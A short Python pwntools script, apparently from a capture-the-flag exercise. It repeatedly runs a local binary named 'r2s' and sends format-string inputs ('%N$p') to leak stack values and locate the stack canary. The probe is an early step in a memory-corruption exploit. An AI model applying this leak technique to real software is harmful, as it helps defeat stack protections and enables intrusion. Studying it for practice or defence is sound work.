from pwn import *
import os

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./r2s', checksec=False)

# Let's fuzz 100 values
for i in range(1,20):
    try:
        p = process(level='debug')
        p.recvuntil(b'Input: ')
        p.sendline('%{}$p'.format(i).encode())
        p.recvuntil(b'\'')
        canary = int(p.recv(18),16)
        print(str(i) + ': ' + hex(canary))
        p.close()
    except ValueError:
        pass